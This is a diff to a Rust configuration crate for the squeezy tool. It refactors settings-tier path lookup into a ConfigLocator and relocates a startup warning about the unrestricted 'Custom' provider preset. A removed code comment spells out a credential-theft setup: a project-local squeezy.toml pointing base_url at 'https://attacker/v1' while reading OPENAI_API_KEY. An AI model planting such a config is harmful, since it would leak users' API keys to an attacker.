@@ -13,11 +13,18 @@ use regex::{Captures, Regex};
 use serde::{Deserialize, Serialize};
 use thiserror::Error;
 
+pub mod config_explain;
 pub mod config_schema;
 mod hardening;
+pub mod provider_metadata;
 pub mod settings_writer;
 pub mod startup_trace;
 pub use hardening::pre_main_hardening;
+pub use provider_metadata::{
+    BASE_PROVIDER_METADATA, BaseProviderMeta, ProviderAuthMeta, bedrock_configured,
+    canonical_provider_name, env_value_set, provider_auth_for_section, provider_auth_metadata,
+    provider_section_for_cli,
+};
 
 pub const DEFAULT_OPENAI_BASE_URL: &str = "https://api.openai.com/v1";
 pub const DEFAULT_OPENAI_MODEL: &str = "gpt-5.5";
@@ -1470,13 +1477,16 @@ impl AppConfig {
         );
         // M-64: the `Custom` preset carries no URL allow-list and accepts
         // whatever `base_url` the (possibly project-local) config supplies,
-        // making it a credential-exfil primitive. `build_openai_compatible_config`
-        // already emits a `tracing::warn!`, but mirror the M-58 path and also
-        // push a structured `ConfigWarning` so the warning reaches the
-        // operator-facing channel even when tracing is unconfigured.
+        // making it a credential-exfil primitive. Emit both the captured
+        // startup log and a structured warning from the resolved config path.
         if let ProviderConfig::OpenAiCompatible(compatible) = &provider
             && compatible.preset == OpenAiCompatiblePreset::Custom
         {
+            tracing::warn!(
+                target: "squeezy_core::config",
+                "Custom preset bypasses URL allow-list; verify base_url={} is trusted",
+                compatible.base_url
+            );
             config_warnings.push(ConfigWarning {
                 source: "providers.custom".to_string(),
                 field: format!(
@@ -10937,6 +10947,53 @@ pub struct ConfigInitTarget {
     pub template: &'static str,
 }
 
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct ConfigTiers {
+    pub cwd: PathBuf,
+    pub user_path: PathBuf,
+    pub project_path: Option<PathBuf>,
+    pub project_path_default: PathBuf,
+    pub repo_root: PathBuf,
+    pub repo_path: PathBuf,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct ConfigLocator {
+    cwd: PathBuf,
+}
+
+impl ConfigLocator {
+    pub fn new(cwd: impl Into<PathBuf>) -> Self {
+        Self { cwd: cwd.into() }
+    }
+
+    pub fn for_current_dir() -> Self {
+        Self::new(env::current_dir().unwrap_or_else(|_| PathBuf::from(".")))
+    }
+
+    pub fn tiers(&self) -> ConfigTiers {
+        let user_path = default_settings_path();
+        let project_path = find_project_settings_path(&self.cwd);
+        let repo_root = repo_root_for_project_settings(&self.cwd, project_path.as_deref());
+        let repo_path = per_repo_settings_path(&repo_root);
+        let project_path_default = project_path
+            .clone()
+            .unwrap_or_else(|| repo_root.join(PROJECT_SETTINGS_FILE));
+        ConfigTiers {
+            cwd: self.cwd.clone(),
+            user_path,
+            project_path,
+            project_path_default,
+            repo_root,
+            repo_path,
+        }
+    }
+
+    pub fn init_target(&self, scope: ConfigInitScope) -> ConfigInitTarget {
+        config_init_target(scope, &self.cwd)
+    }
+}
+
 /// Resolves the settings file and starter template for `squeezy config init`.
 ///
 /// The project and local scopes intentionally mirror runtime settings
@@ -11674,29 +11731,25 @@ pub fn local_settings_template() -> &'static str {
 }
 
 fn load_default_settings_sources() -> Result<(SettingsFile, Vec<String>, Vec<ConfigWarning>)> {
-    let user_path = default_settings_path();
-    let cwd = env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
-    let project_path = find_project_settings_path(&cwd);
-    let repo_root = repo_root_for_project_settings(&cwd, project_path.as_deref());
-    let repo_path = per_repo_settings_path(repo_root);
+    let tiers = ConfigLocator::for_current_dir().tiers();
     let (settings, sources, mut warnings) = load_settings_from_paths(
-        Some(user_path.as_path()),
-        project_path.as_deref(),
-        Some(repo_path.as_path()),
+        Some(tiers.user_path.as_path()),
+        tiers.project_path.as_deref(),
+        Some(tiers.repo_path.as_path()),
     )?;
     // Warn when the user-settings path is relative (meaning neither HOME nor
     // dirs::config_dir resolved a concrete directory). On Windows this most
     // often means APPDATA and USERPROFILE are both absent, which causes
     // settings reads/writes to chase the current working directory instead of
     // a stable per-user location.
-    if user_path.is_relative() {
+    if tiers.user_path.is_relative() {
         warnings.push(ConfigWarning {
             source: "config".to_string(),
             field: format!(
                 "user settings path resolved to a relative path ({}) — \
                  set SQUEEZY_SETTINGS_PATH to an absolute path to ensure \
                  a stable, per-user config location",
-                user_path.display()
+                tiers.user_path.display()
             ),
         });
     }
@@ -11708,7 +11761,7 @@ fn load_default_settings_sources() -> Result<(SettingsFile, Vec<String>, Vec<Con
     if let Some(warning) = home_unset_warning(
         env::var_os("HOME").is_some(),
         env::var_os("SQUEEZY_SETTINGS_PATH").is_some(),
-        &user_path,
+        &tiers.user_path,
     ) {
         warnings.push(warning);
     }
@@ -11830,27 +11883,21 @@ pub struct SeparatedSources {
 /// Loads each tier separately so the UI can compute inheritance per leaf.
 /// Reads each file independently (no merging here).
 pub fn load_separated_settings_sources() -> Result<SeparatedSources> {
-    let user_path = default_settings_path();
-    let cwd = env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
-    let project_path = find_project_settings_path(&cwd);
-    let repo_root = repo_root_for_project_settings(&cwd, project_path.as_deref());
-    let repo_path = per_repo_settings_path(&repo_root);
+    let tiers = ConfigLocator::for_current_dir().tiers();
 
-    let user = load_tier_source(&user_path)?;
-    let project = match project_path.as_ref() {
+    let user = load_tier_source(&tiers.user_path)?;
+    let project = match tiers.project_path.as_ref() {
         Some(p) => load_tier_source(p)?,
         None => None,
     };
-    let repo = load_tier_source(&repo_path)?;
-    let project_path_default =
-        project_path.unwrap_or_else(|| repo_root.join(PROJECT_SETTINGS_FILE));
+    let repo = load_tier_source(&tiers.repo_path)?;
     Ok(SeparatedSources {
         user,
         project,
         repo,
-        user_path_default: user_path,
-        project_path_default,
-        repo_path_default: repo_path,
+        user_path_default: tiers.user_path,
+        project_path_default: tiers.project_path_default,
+        repo_path_default: tiers.repo_path,
     })
 }
 
@@ -12317,7 +12364,9 @@ fn is_loopback_host(host: &str) -> bool {
 /// Secondary env-var names accepted as fallbacks when the preset's
 /// canonical `default_api_key_env` is empty. Lets squeezy honor the
 /// out-of-band conventions mainstream platforms inject.
-fn preset_api_key_env_aliases(preset: OpenAiCompatiblePreset) -> &'static [&'static str] {
+pub(crate) fn preset_api_key_env_aliases(
+    preset: OpenAiCompatiblePreset,
+) -> &'static [&'static str] {
     match preset {
         OpenAiCompatiblePreset::Vercel => &["VERCEL_OIDC_TOKEN"],
         OpenAiCompatiblePreset::CloudflareWorkersAi
@@ -12567,25 +12616,6 @@ fn build_openai_compatible_config(
     } else {
         false
     };
-    // M-64: the `Custom` preset is the documented escape hatch for
-    // self-hosted LiteLLM, vLLM, FastChat, and internal model gateways
-    // (CT-3 in the shared audit). It carries no URL allow-list — every
-    // other preset has a curated `default_base_url` that operators can
-    // recognize at a glance, but Custom accepts whatever the user
-    // supplies. A malicious project-local `./squeezy.toml` with
-    // `model.provider = "openai_compatible"` + `base_url =
-    // "https://attacker/v1"` + `api_key_env = "OPENAI_API_KEY"` is a
-    // one-line credential-exfil primitive. Emit a startup warning so
-    // operators see the resolved host before traffic flows; this is
-    // explicitly *lightweight* (no interactive prompting, no refusal)
-    // because the threat shape is project-config drift, not a
-    // capability we need to gate.
-    if matches!(preset, OpenAiCompatiblePreset::Custom) {
-        tracing::warn!(
-            target: "squeezy_core::config",
-            "Custom preset bypasses URL allow-list; verify base_url={base_url} is trusted"
-        );
-    }
     Ok(ProviderConfig::OpenAiCompatible(OpenAiCompatibleConfig {
         preset,
         api_key_env,
